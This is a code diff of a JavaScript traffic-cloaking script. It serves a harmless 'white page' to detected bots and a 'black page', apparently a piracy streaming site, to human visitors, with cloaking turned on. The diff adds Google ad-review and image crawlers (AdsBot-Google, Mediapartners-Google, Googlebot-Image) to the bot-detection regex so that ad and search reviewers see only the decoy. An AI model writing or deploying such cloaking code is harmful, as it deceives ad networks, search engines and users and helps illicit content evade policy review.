@@ -1,6 +1,6 @@
 // Cloaking
 
-const white_page = "https://react-icons.github.io/react-icons/icons?name=fa"; //white page
+const white_page = "https://www.rumah.com/"; //white page
 const black_page = "https://lk21official.info/"; //black page
 const cloaking_on = true; //Turn to false to turn off cloaking
 
@@ -16,9 +16,12 @@ const isBot = () => {
     /ecosia/, /ia_archiver/,
     /facebook/, /instagram/, /pinterest/, /reddit/,       // SOCIAL MEDIA
     /slack/, /twitter/, /whatsapp/, /youtube/,
-    /semrush/,                                         // OTHER
+    /semrush/, /AdsBot-Google-Mobile/,
+    /AdsBot-Google-Mobile/, /AdsBot-Google/,
+    /Mediapartners-Google/, /AdsBot-Google-Mobile-Apps/,
+    /Googlebot-Image/
   ].map((r) => r.source).join("|"), "i");               // BUILD REGEXP + "i" FLAG
-
+ 
   return robots.test(navigator.userAgent);
 }
 const iframe = document.getElementById('tree');
